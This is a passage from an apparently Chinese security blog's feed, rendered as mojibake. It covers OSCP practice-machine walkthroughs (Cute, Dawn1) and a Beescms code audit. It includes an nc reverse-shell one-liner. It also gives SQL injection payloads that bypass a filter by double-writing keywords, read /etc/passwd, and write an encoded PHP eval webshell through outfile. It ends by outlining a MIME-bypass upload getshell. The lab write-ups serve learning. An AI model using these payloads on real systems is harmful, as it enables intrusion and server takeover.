ä¹‹åå‘ç°ç¡®å®å­˜åœ¨å·®é”™</p><p><img src="/img/OSCP-BBS-Cute/image-20240725213733685.png" alt="image-20240725213733685"></p><p>è¿™é‡Œå¤šäº†<code>CuteNews</code>çš„è·¯å¾„ï¼Œéœ€è¦åˆ é™¤å…¨æ–‡çš„è¿™ä¸ªè·¯å¾„ï¼›å¤§æ¦‚æœ‰äº”å¤„éœ€è¦ä¿®æ”¹ï¼Œä¿®æ”¹ä¹‹åå†æ¬¡æ‰§è¡Œ</p><p><img src="/img/OSCP-BBS-Cute/image-20240725214001302.png" alt="image-20240725214001302"></p><p>æˆåŠŸè·å–shellï¼Œä¹‹åæˆ‘ä»¬åå¼¹è¿‡æ¥nc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.56.101 4444 &gt;/tmp/f</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-BBS-Cute/image-20240725214201428.png" alt="image-20240725214201428"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p>å‘ç°å¯ä»¥sudo çš„ä½¿ç”¨hping3ï¼Œç›´æ¥ææƒ</p><p><img src="/img/OSCP-BBS-Cute/image-20240725215626801.png" alt="image-20240725215626801"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-Dawn1</title>
      <link href="/2024/07/24/OSCP-Dawn1/"/>
      <url>/2024/07/24/OSCP-Dawn1/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”Dawn1"><a href="#OSCPç³»åˆ—é¶æœºâ€”Dawn1" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”Dawn1"></a>OSCPç³»åˆ—é¶æœºâ€”Dawn1</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p>è¿™ä¸ªé¶æœºéœ€è¦æ”¾åœ¨virtualBox ä¸Šï¼Œé‚£ä¹ˆæœ‰å…³virtualBox ä¸ VMware çš„kaliç½‘ç»œé€šè®¯æ–¹æ³•è¯·è®¿é—®ï¼š<a href="https://lusensec.github.io/2024/07/23/Nouns-VirtualBox-VMware-networking/">ã€åŸºç¡€çŸ¥è¯†ã€‘VirtualBoxå’ŒVMwareçš„kaliæ­é…é£Ÿç”¨ | Lusençš„å°çª (lusensec.github.io)</a></p><p><img src="/img/OSCP-Dawn1/image-20240724191243817.png" alt="image-20240724191243817"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><p>1ã€å¿«é€Ÿæ¢æµ‹</p><p><img src="/img/OSCP-Dawn1/image-20240724191602248.png" alt="image-20240724191602248"></p><p>2ã€å…¨ç«¯å£æ‰«æ</p><p><img src="/img/OSCP-Dawn1/image-20240724192957783.png" alt="image-20240724192957783"></p><p>æˆ‘ä»¬è¿å¸¦UDPä¹Ÿä¸€èµ·æ‰«æ</p><p><img src="/img/OSCP-Dawn1/image-20240724193358714.png" alt="image-20240724193358714"></p><p>3ã€æœåŠ¡ç‰ˆæœ¬æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 80,137,139,445,3306,5353 192.168.56.103</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Dawn1/image-20240724193554220.png" alt="image-20240724193554220"></p><p>éƒ½æ˜¯å¸¸è§çš„é‚£äº›æœåŠ¡ï¼Œè¿™é‡Œ5353æ˜¯éœ€è¦udpæ‰«æï¼Œæš‚æ—¶å…ˆæç½®ä¸‹æ¥ï¼›åé¢ä¹Ÿæœ‰å¯¹ä¸»æœºçš„ä¸€ä¸ªæ‰«æï¼Œè·‘åœ¨linuxæœåŠ¡å™¨ä¸Š</p><p><img src="/img/OSCP-Dawn1/image-20240724193616284.png" alt="image-20240724193616284"></p><p>è¿™ä¸ªsmbæœåŠ¡ä¼šä¸ä¼šå­˜åœ¨æ¼æ´å‘¢</p><p>4ã€æ¼æ´æ¢æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 80,137,139,445,3306,5353 192.168.56.103</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Dawn1/image-20240724194045320.png" alt="image-20240724194045320"></p><p>80ç«¯å£åšäº†ä¸€ä¸ªç›®å½•æ‰«æï¼Œå‘ç°<code>logs</code>ç›®å½•ï¼›åé¢è¿˜æœ‰å¯¹ä¸»æœºå±•å¼€æ¢æµ‹çš„ï¼Œå‘ç°ä¸€ä¸ªæ˜“å—dosæ”»å‡»çš„smbæœåŠ¡</p><p><img src="/img/OSCP-Dawn1/image-20240724194221909.png" alt="image-20240724194221909"></p><h2 id="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTPä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€é¦–é¡µä¸æºä»£ç "><a href="#1ã€é¦–é¡µä¸æºä»£ç " class="headerlink" title="1ã€é¦–é¡µä¸æºä»£ç "></a>1ã€é¦–é¡µä¸æºä»£ç </h3><p><img src="/img/OSCP-Dawn1/image-20240724194421929.png" alt="image-20240724194421929"></p><p>OKï¼Œæ²¡æœ‰ç»™ä»»ä½•çš„æç¤ºï¼Œç”šè‡³è¿™ä¸ªæ ‡ç­¾å†™çš„éƒ½æœ‰ç‚¹ä¸å¤ªåˆ°ä½</p><p><img src="/img/OSCP-Dawn1/image-20240724194535214.png" alt="image-20240724194535214"></p><h3 id="2ã€ç›®å½•æ¢æµ‹"><a href="#2ã€ç›®å½•æ¢æµ‹" class="headerlink" title="2ã€ç›®å½•æ¢æµ‹"></a>2ã€ç›®å½•æ¢æµ‹</h3><p><img src="/img/OSCP-Dawn1/image-20240724194747417.png" alt="image-20240724194747417"></p><p>ä¹Ÿæ˜¯åªæ‰«åˆ°<code>logs</code>ç›®å½•</p><h3 id="3ã€logsç›®å½•"><a href="#3ã€logsç›®å½•" class="headerlink" title="3ã€logsç›®å½•"></a>3ã€logsç›®å½•</h3><p><img src="/img/OSCP-Dawn1/image-20240724194815126.png" alt="image-20240724194815126"></p><p>æ¬¸ï¼Œè¿™ä¸ª<code>auth.log</code>çš„æ–‡ä»¶åå¥½çœ¼ç†Ÿæ¬¸ï¼Œä½†æ˜¯æˆ‘ä»¬ç‚¹è¿›å»ä¹‹åæ˜¯è¿™æ ·çš„ï¼›çœ‹æ¥ä½œä¸ºwwwç”¨æˆ·æ˜¯æ²¡æœ‰è®¿é—®æƒé™çš„</p><p><img src="/img/OSCP-Dawn1/image-20240724194914332.png" alt="image-20240724194914332"></p><p>ä½†æ˜¯è¿™ä¸ªæ–‡ä»¶å´å¯ä»¥ä¸‹è½½ä¸‹æ¥</p><p><img src="/img/OSCP-Dawn1/image-20240724195020324.png" alt="image-20240724195020324"></p><p>è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹çœ‹èµ·æ¥åƒæ˜¯æŸä¸ªç›‘æ§è½¯ä»¶çš„æ—¥å¿—ï¼›ç»“åˆwwwç”¨æˆ·å¯ä»¥æŸ¥çœ‹ï¼Œæ¨æµ‹æ˜¯webæœåŠ¡åº”ç”¨</p><p><img src="/img/OSCP-Dawn1/image-20240724195603660.png" alt="image-20240724195603660"></p><p>æ‰€ä»¥webä¸€å®šæ˜¯æœ‰ä¸œè¥¿å­˜åœ¨çš„</p><h2 id="å››ã€SMBä¿¡æ¯æ”¶é›†"><a href="#å››ã€SMBä¿¡æ¯æ”¶é›†" class="headerlink" title="å››ã€SMBä¿¡æ¯æ”¶é›†"></a>å››ã€SMBä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€å°è¯•smbè¿æ¥"><a href="#1ã€å°è¯•smbè¿æ¥" class="headerlink" title="1ã€å°è¯•smbè¿æ¥"></a>1ã€å°è¯•smbè¿æ¥</h3><p><img src="/img/OSCP-Dawn1/image-20240724214009409.png" alt="image-20240724214009409"></p><p>å°è¯•è¿æ¥ï¼›è¿æ¥æˆåŠŸï¼Œæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥æŸ¥çœ‹ç¡®æ˜¯ä¸€ä¸ªç©ºæ–‡ä»¶</p><p><img src="/img/OSCP-Dawn1/image-20240724214249107.png" alt="image-20240724214249107"></p><p><img src="/img/OSCP-Dawn1/image-20240724214457912.png" alt="image-20240724214457912"></p><h3 id="2ã€å°è¯•smbæ–‡ä»¶ä¸Šä¼ "><a href="#2ã€å°è¯•smbæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="2ã€å°è¯•smbæ–‡ä»¶ä¸Šä¼ "></a>2ã€å°è¯•smbæ–‡ä»¶ä¸Šä¼ </h3><p>æ—¢ç„¶è¿™ä¸ªsmb é‡Œé¢æ²¡æœ‰ä¸œè¥¿ï¼Œé‚£æˆ‘ä»¬å°è¯•æ–‡ä»¶ä¸Šä¼ </p><p><img src="/img/OSCP-Dawn1/image-20240724214538582.png" alt="image-20240724214538582"></p><p>ä¸Šä¼ æˆåŠŸï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™åœ¨ä¹‹åçš„æ¸—é€ä¸­å¯èƒ½æœ‰ç”¨</p><h2 id="äº”ã€MySQLä¿¡æ¯æ”¶é›†"><a href="#äº”ã€MySQLä¿¡æ¯æ”¶é›†" class="headerlink" title="äº”ã€MySQLä¿¡æ¯æ”¶é›†"></a>äº”ã€MySQLä¿¡æ¯æ”¶é›†</h2><p>åœ¨ç®€å•å°è¯•äº†å¼±å£ä»¤å¤±è´¥åï¼Œæç¤ºç»™çš„å¯†ç ä¸æ­£ç¡®ï¼Œæˆ‘ä»¬æ¥å°è¯•çˆ†ç ´å¯†ç </p><p><img src="/img/OSCP-Dawn1/image-20240724215424155.png" alt="image-20240724215424155"></p><p>å…ˆçˆ†ç ´ï¼Œç»§ç»­å¾€å</p><h2 id="å…­ã€Getshell"><a href="#å…­ã€Getshell" class="headerlink" title="å…­ã€Getshell"></a>å…­ã€Getshell</h2><h3 id="1ã€managemet-log-æ–‡ä»¶"><a href="#1ã€managemet-log-æ–‡ä»¶" class="headerlink" title="1ã€managemet.log æ–‡ä»¶"></a>1ã€managemet.log æ–‡ä»¶</h3><p>åˆ°æ­¤ä¸ºæ­¢ï¼Œå†æ— ä»»ä½•çš„ä¿¡æ¯å¯ä¾›æ”¶é›†ï¼Œäºæ˜¯åˆå»çœ‹äº†<code>management.log</code>æ–‡ä»¶ï¼Œé‡æ–°ä¸‹è½½äº†ä¸€é</p><p><img src="/img/OSCP-Dawn1/image-20240724220244351.png" alt="image-20240724220244351"></p><p>å±…ç„¶å¤šäº†å¥½å¤šä¸œè¥¿ï¼Œçœ‹è¿™æ ·å­ï¼Œå¥½åƒæ˜¯ç³»ç»Ÿå„è¿›ç¨‹çš„ä¿¡æ¯</p><p><img src="/img/OSCP-Dawn1/image-20240724220324695.png" alt="image-20240724220324695"></p><p>ä¹‹å‰æ²¡æœ‰è¿™äº›ä¸œè¥¿ï¼Œå¯èƒ½æ˜¯åˆšå¼€æœºï¼Œå¾ˆå¤šæœåŠ¡æ²¡åŠ è½½å‡ºæ¥ï¼›åœ¨æœ€åå‘ç°äº†å¾ˆå¤šæœ‰è¶£çš„ä¸œè¥¿</p><p><img src="/img/OSCP-Dawn1/image-20240724220543948.png" alt="image-20240724220543948"></p><p>æœ‰ä¸¤ä¸ªç”¨æˆ·å<code>ganimedes</code>å’Œ<code>dawn</code>ï¼Œè¿˜æœ‰ä¸¤ä¸ª777çš„æ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„å¾ˆå¯ç–‘ï¼Œ<code>/home/dawn/ITDEPT/web-control</code>ä¸­çš„<code>ITDEPT</code>ä¼¼ä¹åœ¨å“ªå„¿è§è¿‡</p><p><img src="/img/OSCP-Dawn1/image-20240724221032662.png" alt="image-20240724221032662"></p><p>æ¬¸ï¼Œè«ä¸æ˜¯åŒä¸€ä¸ªåœ°æ–¹ï¼Ÿ</p><h3 id="2ã€smbæ–‡ä»¶ä¸Šä¼ åŠ å®šæ—¶æ‰§è¡Œgetshell"><a href="#2ã€smbæ–‡ä»¶ä¸Šä¼ åŠ å®šæ—¶æ‰§è¡Œgetshell" class="headerlink" title="2ã€smbæ–‡ä»¶ä¸Šä¼ åŠ å®šæ—¶æ‰§è¡Œgetshell"></a>2ã€smbæ–‡ä»¶ä¸Šä¼ åŠ å®šæ—¶æ‰§è¡Œgetshell</h3><p>åœ¨<code>management.log</code>æ–‡ä»¶ä¸­æ˜¾ç¤ºï¼Œåªä¼šæ‰§è¡Œ<code>ITDEPT</code>è·¯å¾„ä¸‹çš„<code>web-control</code>æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªåå¼¹shell çš„<code>web-control</code>æ–‡ä»¶ä¸Šå»ç­‰å¾…æ‰§è¡Œ</p><p><img src="/img/OSCP-Dawn1/image-20240724221357960.png" alt="image-20240724221357960"></p><p>é€šè¿‡smb ä¸Šä¼ è¯¥æ–‡ä»¶ï¼Œç­‰å¾…æ‰§è¡Œ</p><p><img src="/img/OSCP-Dawn1/image-20240724221430449.png" alt="image-20240724221430449"></p><p>ç­‰å¾…äº†è®¸é•¿æ—¶é—´ä¸è§åå¼¹ï¼Œæˆ‘ä»¬ä¿®æ”¹åå¼¹çš„å‘½ä»¤ï¼Œå†æ¬¡ç­‰å¾…</p><p><img src="/img/OSCP-Dawn1/image-20240724222148047.png" alt="image-20240724222148047"></p><p>OKï¼Œä¹Ÿæ˜¯ç»ˆäºæ¥æ”¶åˆ°åå¼¹äº†ï¼ŒæˆåŠŸgetshell</p><h2 id="ä¸ƒã€æƒé™æå‡"><a href="#ä¸ƒã€æƒé™æå‡" class="headerlink" title="ä¸ƒã€æƒé™æå‡"></a>ä¸ƒã€æƒé™æå‡</h2><h3 id="1ã€ä¿¡æ¯æ”¶é›†"><a href="#1ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="1ã€ä¿¡æ¯æ”¶é›†"></a>1ã€ä¿¡æ¯æ”¶é›†</h3><p><img src="/img/OSCP-Dawn1/image-20240724222400890.png" alt="image-20240724222400890"></p><p>è¿™é‡Œlogsç›®å½•çš„å…¶ä»–æ–‡ä»¶æœç„¶æ˜¯wwwç”¨æˆ·æ— æƒé™æŸ¥çœ‹</p><p><img src="/img/OSCP-Dawn1/image-20240724222502809.png" alt="image-20240724222502809"></p><p>æ¬¸ï¼Œè¿™é‡Œæœ‰ä¸ª<code>.index.html.swp</code>æ–‡ä»¶ç«Ÿç„¶æ²¡æœ‰æ‰«å‡ºæ¥ï¼Œçœ‹æ¥ä»¥åè¦æ‰«æåˆ°ç»†è‡´æ‰è¡Œ</p><p><img src="/img/OSCP-Dawn1/image-20240724223047805.png" alt="image-20240724223047805"></p><p>è¿™é‡Œä¹Ÿç¡®å®æ˜¯æˆ‘ä»¬æ¨æµ‹çš„é‚£ä¸ªç›®å½•</p><h3 id="2ã€sudoæå‡è‡³root"><a href="#2ã€sudoæå‡è‡³root" class="headerlink" title="2ã€sudoæå‡è‡³root"></a>2ã€sudoæå‡è‡³root</h3><p>å‘ç°å­˜åœ¨sudo æ»¥ç”¨ï¼Œç›´æ¥ä¸€å¥è¯ææƒ</p><p><img src="/img/OSCP-Dawn1/image-20240724223323889.png" alt="image-20240724223323889"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PHPä»£ç å®¡è®¡ã€‘Beescmsä»£ç å®¡è®¡</title>
      <link href="/2024/07/24/Code-Audit-PHP-Beescms/"/>
      <url>/2024/07/24/Code-Audit-PHP-Beescms/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€å‰è¨€"><a href="#ä¸€ã€å‰è¨€" class="headerlink" title="ä¸€ã€å‰è¨€"></a>ä¸€ã€å‰è¨€</h1><p>å‰å‡ å¤©åœ¨nssctf å‚åŠ äº†awd èµ›äº‹ï¼Œä½¿ç”¨çš„é¶åœºå°±æ˜¯Beescmsï¼Œèµ›äº‹è¿‡åå¯¹è¿™ä¸ªé¶åœºå¤šäº†ä¸€ç‚¹ç†è§£ï¼Œè¶çƒ­æ‰“é“ï¼Œåˆ†æä¸€ä¸‹beescms æ¼æ´é€ æˆçš„åŸå› </p><h1 id="äºŒã€åå°ç™»é™†SQLæ³¨å…¥æ¼æ´"><a href="#äºŒã€åå°ç™»é™†SQLæ³¨å…¥æ¼æ´" class="headerlink" title="äºŒã€åå°ç™»é™†SQLæ³¨å…¥æ¼æ´"></a>äºŒã€åå°ç™»é™†SQLæ³¨å…¥æ¼æ´</h1><p>æ¼æ´ä»£ç ä½ç½®åœ¨<code>admin/login.php</code>æ–‡ä»¶ä¸­</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241021235458049.png" alt="image-20241021235458049"></p><p>è€ŒçœŸæ­£å®ç°ç™»é™†æŸ¥è¯¢çš„æ“ä½œåœ¨<code>includes/fun.php</code>çš„<code>check_login</code> å‡½æ•°ï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿè¿™ä¸ªå‡½æ•°çš„ä¸»è¦ä»£ç éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rel</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span> . DB_PRE . <span class="string">&quot;admin where admin_name=&#x27;&quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br><span class="line"><span class="variable">$rel</span> = <span class="keyword">empty</span>(<span class="variable">$rel</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="variable">$rel</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$rel</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&#x27;ä¸å­˜åœ¨è¯¥ç®¡ç†ç”¨æˆ·&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$password</span> != <span class="variable">$rel</span>[<span class="string">&#x27;admin_password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&quot;è¾“å…¥çš„å¯†ç ä¸æ­£ç¡®&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rel</span>[<span class="string">&#x27;is_disable&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&#x27;è¯¥è´¦å·å·²ç»è¢«é”å®š,æ— æ³•ç™»é™†&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ™ç™»é™†æˆåŠŸ</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä¼ å…¥çš„ç”¨æˆ·åç›´æ¥æ‹¼æ¥åœ¨SQLè¯­å¥ä¸­ï¼Œé€ æˆSQLæ³¨å…¥ï¼›å½“ç„¶ï¼Œå…‰è¿™é‡Œæ˜¯ä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬å‘ç°ï¼Œåœ¨åç«¯æ¥æ”¶è´¦å·å¯†ç çš„æ—¶å€™å°±åˆ©ç”¨å‡½æ•°è¿›è¡Œäº†è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹<code>fl_value</code> å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file |outfile/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­äº†ç”¨æˆ·åæ˜¯å¦ä¸ºç©ºï¼Œç„¶åå¯¹å…¶ä¸­çš„<code>select</code>ç­‰å­—ç¬¦æ›¿æ¢ä¸ºç©ºï¼Œè¿™ä¸ªåœ°æ–¹æˆ‘ä»¬å¯ä»¥ç”¨åŒå†™ç»•è¿‡</p><p>å†çœ‹<code>fl_html</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ç”¨<code>htmlspecialchars</code> å°†ç”¨æˆ·åè¿›è¡Œhtmlå®ä½“è½¬æ¢ï¼Œä½†æ˜¯ï¼Œä»–è¿™ä¸ªå†™æ³•æœ‰ä¸¢ä¸¢ç¼ºé™·ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022000854070.png" alt="image-20241022000854070"></p><p>å°±æ˜¯è¯´ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰è¿‡æ»¤å•å¼•å·â€™ï¼Œå¯¼è‡´è¢«ç»•è¿‡</p><p>payloadå¦‚ä¸‹ï¼š</p><p>1â€™ a and nd extractvalue(1,concat(0x7e,(select user()),0x7e))#</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022001524357.png" alt="image-20241022001524357"></p><p>å…¶ä»–åˆ©ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1ã€è¯»å–æ–‡ä»¶ï¼š</span></span><br><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(select load_file(&#x27;</span>/etc/passwd<span class="string">&#x27;)),0x7e))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 2ã€å†™å…¥webshell</span></span><br><span class="line"><span class="string">admin&#x27;</span> uni union on selselectect <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e</span>  in into  outoutfilefile <span class="string">&#x27;/var/www/html/index_backup.php&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">æˆ–</span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27; uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62)  in into  outoutfilefile &#x27;</span>C:/phpStudy/WWW/beescms/cmd.php<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h1 id="ä¸‰ã€åå°æ–‡ä»¶ä¸Šä¼ Getshell"><a href="#ä¸‰ã€åå°æ–‡ä»¶ä¸Šä¼ Getshell" class="headerlink" title="ä¸‰ã€åå°æ–‡ä»¶ä¸Šä¼ Getshell"></a>ä¸‰ã€åå°æ–‡ä»¶ä¸Šä¼ Getshell</h1><p>æ¥åå°æ·»åŠ æ–‡ç« æ¨¡å—ä¸­ä¸Šä¼ å›¾ç‰‡</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022001903887.png" alt="image-20241022001903887"></p><p>åœ¨BPä¸­çœ‹åˆ°ä¼ é€’çš„é“¾æ¥åœ°å€åœ¨<code>/admin/admin_pic_upload.php?type=radio&amp;get=thumb</code></p><p>æŸ¥çœ‹å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span> = <span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨åç«¯ä¼¼ä¹ä»…ä»…åšäº†MIMEæ£€æµ‹ï¼Œè¿™ä¸ªæ˜¯å¾ˆå¥½ç»•è¿‡çš„ï¼Œåœ¨<code>up_img</code> å‡½æ•°ä¸­ä¹Ÿä»…ä»…é™åˆ¶äº†å¤§å°å’Œåˆ¤æ–­äº†MIME æ ¼å¼ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‚¹æ˜¯ä¼šé‡å‘½åæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$up_file_name</span> = <span class="keyword">empty</span>(<span class="variable">$pic_alt</span>) ? <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) : <span class="variable">$pic_alt</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å»æ‹¿æ–‡ä»¶ï¼Œç„¶åè·Ÿä¸Šphpå³å¯è¿æ¥shell</p><p><img src="/img/Code-Audit-PHP-Beescms/image-20241022004613854.png" alt="image-20241022004613854"></p><h1 id="å››ã€ä»»æ„PHPæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#å››ã€ä»»æ„PHPæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" 